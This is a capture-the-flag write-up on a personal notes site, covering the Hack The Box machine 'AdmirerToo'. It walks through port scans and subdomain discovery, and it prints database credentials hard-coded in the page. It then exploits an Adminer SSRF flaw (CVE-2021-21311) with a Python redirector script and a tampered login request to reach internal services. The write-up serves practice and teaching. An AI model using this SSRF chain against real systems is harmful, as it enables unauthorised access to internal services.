<!DOCTYPE html>
<html lang="en" class="h-full">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="2.4.0.712629696703">

    <!-- See retype.com -->
    <meta name="generator" content="Retype 2.4.0">

    <!-- Primary Meta Tags -->
    <title>AdmirerToo</title>
    <meta name="title" content="AdmirerToo">
    <meta name="description" content="IP: 10.10.11.137" />

    <!-- Canonical -->
    <link rel="canonical" href="https://caueb.github.io/writeups/htb/boxes/admirertoo/" />

    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://caueb.github.io/writeups/htb/boxes/admirertoo/">
    <meta property="og:title" content="AdmirerToo">
    <meta property="og:description" content="IP: 10.10.11.137">
    <meta property="og:image" content="https://caueb.github.io/writeups/htb/boxes/admirertoo/images/admirer.png">

    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://caueb.github.io/writeups/htb/boxes/admirertoo/">
    <meta property="twitter:title" content="AdmirerToo">
    <meta property="twitter:description" content="IP: 10.10.11.137">
    <meta property="twitter:image" content="https://caueb.github.io/writeups/htb/boxes/admirertoo/images/admirer.png">

    <script>(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>

    <link href="../../../../resources/css/retype.css?v=2.4.0.712629696703" rel="stylesheet" />

    <script type="text/javascript" src="../../../../resources/js/config.js?v=2.4.0.712629696703" data-turbo-eval="false" defer></script>
    <script type="text/javascript" src="../../../../resources/js/retype.js?v=2.4.0" data-turbo-eval="false" defer></script>
    <script id="lunr-js" type="text/javascript" src="../../../../resources/js/lunr.js?v=2.4.0.712629696703" data-turbo-eval="false" defer></script>
    <script id="prism-js" type="text/javascript" src="../../../../resources/js/prism.js?v=2.4.0.712629696703" defer></script>
</head>
<body>
    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
    
        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
            <div class="container relative flex items-center justify-between grow pr-6 md:justify-start">
                <!-- Mobile menu button skeleton -->
                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
                <div v-cloak id="docs-sidebar-toggle"></div>
        
                <!-- Logo -->
                <div class="flex items-center justify-between h-full py-2 md:w-75">
                    <div class="flex items-center px-2 md:px-6">
                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">Caue</span>
                        </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">ctf-notes</span>
                    </div>
        
                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
                </div>
        
                <div class="flex justify-between md:grow">
                    <!-- Top Nav -->
                    <nav class="hidden md:flex">
                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/caueb" target="_blank">
                                    <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                        <g fill="currentColor">
                                            <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
                                        </g>
                                    </svg>
                                    <span>GitHub</span>
                                </a>
                            </li>
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://app.hackthebox.com/profile/78913" target="_blank">
                                    <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                        <g fill="currentColor">
                                            <path fill-rule="evenodd" d="M12.876.64a1.75 1.75 0 00-1.75 0l-8.25 4.762a1.75 1.75 0 00-.875 1.515v9.525c0 .625.334 1.203.875 1.515l8.25 4.763a1.75 1.75 0 001.75 0l8.25-4.762a1.75 1.75 0 00.875-1.516V6.917a1.75 1.75 0 00-.875-1.515L12.876.639zm-1 1.298a.25.25 0 01.25 0l7.625 4.402-7.75 4.474-7.75-4.474 7.625-4.402zM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947L3.501 7.64zm9.25 13.421l7.625-4.402a.25.25 0 00.125-.216V7.639l-7.75 4.474v8.947z"/>
                                        </g>
                                    </svg>
                                    <span>HackTheBox</span>
                                </a>
                            </li>
        
                        </ul>
                    </nav>
        
                    <!-- Header Right Skeleton -->
                    <div v-cloak class="flex justify-end grow skeleton">
        
                        <!-- Search input mock -->
                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                            </div>
        
                            <input class="w-full h-10 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 placeholder-gray-400 dark:placeholder-dark-400"
                            style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search" />
                        </div>
        
                        <!-- Mobile search button mock -->
                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                        </div>
        
                        <!-- Dark mode switch placehokder -->
                        <div class="w-10 h-10 lg:ml-2"></div>
        
                        <!-- History button mock -->
                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
                        </div>
                    </div>
        
                    <div v-cloak class="flex justify-end grow">
                        <div id="docs-mobile-search-button"></div>
                        <doc-search-desktop></doc-search-desktop>
        
                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
                        <doc-history></doc-history>
                    </div>
                </div>
            </div>
        </header>
    
        <div class="container relative flex bg-white">
            <!-- Sidebar Skeleton -->
            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
            
                <!-- Render this div, if config.showSidebarFilter is `true` -->
                <div class="flex items-center h-16 px-6">
                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter" />
                </div>
            
                <div class="pl-6 mb-4 mt-1">
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                </div>
            
                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                        <span class="text-xs whitespace-nowrap">Powered by</span>
                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                    </a>
                </div>
            </div>
            
            <!-- Sidebar component -->
            <doc-sidebar v-cloak>
                <template #sidebar-footer>
                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
            
                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
                            <nav>
                                <ul class="flex flex-wrap justify-center items-center">
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/caueb" target="_blank">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                <g fill="currentColor">
                                                    <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
                                                </g>
                                            </svg>
                                            <span>GitHub</span>
                                        </a>
                                    </li>
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://app.hackthebox.com/profile/78913" target="_blank">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                <g fill="currentColor">
                                                    <path fill-rule="evenodd" d="M12.876.64a1.75 1.75 0 00-1.75 0l-8.25 4.762a1.75 1.75 0 00-.875 1.515v9.525c0 .625.334 1.203.875 1.515l8.25 4.763a1.75 1.75 0 001.75 0l8.25-4.762a1.75 1.75 0 00.875-1.516V6.917a1.75 1.75 0 00-.875-1.515L12.876.639zm-1 1.298a.25.25 0 01.25 0l7.625 4.402-7.75 4.474-7.75-4.474 7.625-4.402zM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947L3.501 7.64zm9.25 13.421l7.625-4.402a.25.25 0 00.125-.216V7.639l-7.75 4.474v8.947z"/>
                                                </g>
                                            </svg>
                                            <span>HackTheBox</span>
                                        </a>
                                    </li>
            
                                </ul>
                            </nav>
                        </div>
            
                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                            <span class="text-xs whitespace-nowrap">Powered by</span>
                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                        </a>
                    </div>
                </template>
            </doc-sidebar>
    
            <div class="grow min-w-0 dark:bg-dark-850">
                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                <div class="flex">
                    <div class="grow min-w-0 px-6 md:px-16">
                        <main class="relative pt-6 pb-16">
                            <div class="docs-markdown" id="docs-content">
                                <!-- Rendered if sidebar right is enabled -->
                                <div id="docs-sidebar-right-toggle"></div>
                
                                <!-- Page content  -->
<doc-anchor-target id="admirertoo" class="break-words">
    <h1>
        <doc-anchor-trigger class="header-anchor-trigger" to="#admirertoo">#</doc-anchor-trigger>
        <span>AdmirerToo</span>
    </h1>
</doc-anchor-target>
<p><figure class="content-center">
    <img src="images/admirer.png" alt="" />
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>IP: 10.10.11.137</p>
<doc-anchor-target id="nmap">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#nmap">#</doc-anchor-trigger>
        <span>Nmap</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="all-ports">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#all-ports">#</doc-anchor-trigger>
        <span>All ports</span>
    </h3>
</doc-anchor-target>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ sudo nmap -p- --min-rate=1000 -T4 10.10.11.137

PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
4242/tcp  filtered vrml-multi-use                                                                                                                           
16010/tcp filtered unknown                                                                                                                                  
16030/tcp filtered unknown</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="version--script-scan-on-open-ports">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#version--script-scan-on-open-ports">#</doc-anchor-trigger>
        <span>Version &amp; Script scan on open ports</span>
    </h3>
</doc-anchor-target>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">sudo nmap -sC -sV -p 22,80 10.10.11.137

Nmap 7.92 scan initiated Thu Mar 24 14:17:01 2022 as: nmap -sC -sV -p 22,80 -o nmap 10.10.11.137
Nmap scan report for 10.10.11.137
Host is up (0.32s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 99:33:47:e6:5f:1f:2e:fd:45:a4:ee:6b:78:fb:c0:e4 (RSA)
|   256 4b:28:53:64:92:57:84:77:5f:8d:bf:af:d5:22:e1:10 (ECDSA)
|_  256 71:ee:8e:e5:98:ab:08:43:3b:86:29:57:23:26:e9:10 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Admirer
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="port-80---http">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#port-80---http">#</doc-anchor-trigger>
        <span>Port 80 - HTTP</span>
    </h2>
</doc-anchor-target>
<p>Looking at the webpage on port 80 we can see an email and domain when we make a request to a non existent page:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ curl http://10.10.11.137/test                               
&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.38 (Debian) Server at &lt;a href=&quot;mailto:webmaster@admirer-gallery.htb&quot;&gt;10.10.11.137&lt;/a&gt; Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;</code></pre>
</doc-codeblock></div>
<p>We get <code v-pre>webmaster@admirer-gallery.htb</code>. Lets add it to our <code v-pre>/etc/hosts</code> file.</p>
<doc-anchor-target id="subdomains">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#subdomains">#</doc-anchor-trigger>
        <span>Subdomains</span>
    </h3>
</doc-anchor-target>
<p>Lets check if there is any other subdomains:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ gobuster vhost -u http://admirer-gallery.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://admirer-gallery.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/03/24 14:42:25 Starting gobuster in VHOST enumeration mode
===============================================================
Found: db.admirer-gallery.htb (Status: 200) [Size: 2568]</code></pre>
</doc-codeblock></div>
<p>Lets add <code v-pre>db.admirer-gallery.htb</code> to our <code v-pre>/etc/hosts</code> file too.</p>
<doc-anchor-target id="dbadmirergalleryhtb">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#dbadmirergalleryhtb">#</doc-anchor-trigger>
        <span>DB.ADMIRER.GALLERY.HTB</span>
    </h3>
</doc-anchor-target>
<p>Accessing <a href="http://db.admirer-gallery.htb">http://db.admirer-gallery.htb</a> we get the Adminer v4.7.8 portal:
<figure class="content-center">
    <img src="images/image1.png" alt="" />
    <figcaption class="caption"></figcaption>
</figure>
We have access to database via web. Let’s enter and look for any interesting tables. just hit enter, and we are in.
There’s only one table and nothing really interesting in that. The reason why it didn’t ask for any credentials is that the credentials are hard-coded in the page and POST them once we click on &quot;enter&quot; button&quot;</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-markup"><code v-pre class="language-markup">&lt;input type=&quot;hidden&quot; name=&quot;auth[driver]&quot; value=&quot;server&quot;&gt;  
&lt;input type=&quot;hidden&quot; name=&quot;auth[server]&quot; value=&quot;localhost&quot;&gt;  
&lt;input type=&quot;hidden&quot; name=&quot;auth[username]&quot; value=&quot;admirer_ro&quot;&gt;  
&lt;input type=&quot;hidden&quot; name=&quot;auth[password]&quot; value=&quot;1w4nn4b3adm1r3d2!&quot;&gt;  
&lt;input type='hidden' name=&quot;auth[db]&quot; value=&quot;admirer&quot;/&gt;  
&lt;input type='hidden' name=&quot;auth[permanent]&quot; value=&quot;1&quot;/&gt;</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="adminer-cve">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#adminer-cve">#</doc-anchor-trigger>
        <span>ADMINER CVE</span>
    </h4>
</doc-anchor-target>
<p>After trying to use this credentials to login via SSH and failing I found a <a href="https://www.cvedetails.com/cve/CVE-2021-21311/">CVE-2021-21311</a> that could be useful. It affects all Adminer fromv ersion 4.0.0 and before 4.7.9. As we can see in the machine is running version 4.7.8 so it is vulnerable!
Basically is a Server-Side Request Forgery to access an internal server/service.
There’s a <a href="https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf">POC</a> already available for this. We just need to setup a redirector on our Kali Linux machine.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<div class="codeblock-title">redirector.py</div>
<pre class="language-python"><code v-pre class="language-python">#!/usr/bin/env python3  
#python3 ./redirector.py 8000 http://127.0.0.1/  
import sys  
from http.server import HTTPServer, BaseHTTPRequestHandler  
  
if len(sys.argv)-1 != 2:  
	print(&quot;Usage: {} &lt;port_number&gt; &lt;url&gt;&quot;.format(sys.argv[0]))  
	sys.exit()  
  
class Redirect(BaseHTTPRequestHandler):  
	def do_GET(self):  
		self.send_response(302)  
		self.send_header('Location', sys.argv[2])  
		self.end_headers()
		
HTTPServer((&quot;&quot;, int(sys.argv[1])), Redirect).serve_forever()</code></pre>
</doc-codeblock></div>
<p>Start the redirector script:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 http://127.0.0.1</code></pre>
</doc-codeblock></div>
<p>For this to work, we need to capture the request of logging into the DB in Burp Suite. Make sure not to send this to repeater.</p>
<p>Analyse the login POST request:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">POST /?server=localhost HTTP/1.1
Host: db.admirer-gallery.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://db.admirer-gallery.htb/?server=localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 162
Origin: http://db.admirer-gallery.htb
Connection: close
Cookie: adminer_sid=aqj7ovn7kmpnjuce2nkuk246tb; adminer_key=ed3272eb38f41555a6213568a05fb352; adminer_version=4.8.1; adminer_permanent=
Upgrade-Insecure-Requests: 1

auth%5Bdriver%5D=server&amp;auth%5Bserver%5D=localhost&amp;auth%5Busername%5D=admirer_ro&amp;auth%5Bpassword%5D=1w4nn4b3adm1r3d2%21&amp;auth%5Bdb%5D=admirer&amp;auth%5Bpermanent%5D=1</code></pre>
</doc-codeblock></div>
<p>This is a default request. If we change <code v-pre>Auth Server</code> value from <code v-pre>localhost</code> to our <code v-pre>Kali IP address</code> and forward the request to server, then we’d get this error:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">Connection refused</code></pre>
</doc-codeblock></div>
<p>So, we need to edit <code v-pre>Auth Driver</code> value and <code v-pre>Auth Server</code> value. According to POC PDF, we need to modify auth drive value to <code v-pre>elasticsearch</code> and auth server value as our attacking machine’s IP address (Kali Linux).
After changing the both values, I couldn’t get a hit on our python script. Then I looked into the source of <code v-pre>Adminer</code> at <a href="https://github.com/vrana/adminer/tree/master/adminer/drivers">https://github.com/vrana/adminer/tree/master/adminer/drivers</a>:</p>
<p>As you can see the source code, the driver name is just <code v-pre>elastic</code> not <code v-pre>elasticsearch</code>. This is the reason it didn’t work. Let’s change both values one more time.
<figure class="content-center">
    <img src="images/image2.png" alt="" />
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>We get a hit:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 'http://127.0.0.1'
10.10.11.137 - - [24/Mar/2022 15:13:24] &quot;GET / HTTP/1.0&quot; 302 -
10.10.11.137 - - [24/Mar/2022 15:13:24] &quot;GET / HTTP/1.0&quot; 302 -</code></pre>
</doc-codeblock></div>
<p>We got the <code v-pre>index.html</code> source of target port 80. This simply means, we can access any locally running service.
<figure class="content-center">
    <img src="images/image3.png" alt="" />
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>As we saw in our initial port scan that three ports are filtered. Let’s try to access them via SSRF. Setup redirector for any of the three filtered ports.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 'http://127.0.0.1:4242'</code></pre>
</doc-codeblock></div>
<p>Intercept the login request once again and check the webpage.
We got the response and the title of the page is &quot;OpenTSDB&quot;.
<figure class="content-center">
    <img src="images/image4.png" alt="" />
    <figcaption class="caption"></figcaption>
</figure>
</p>
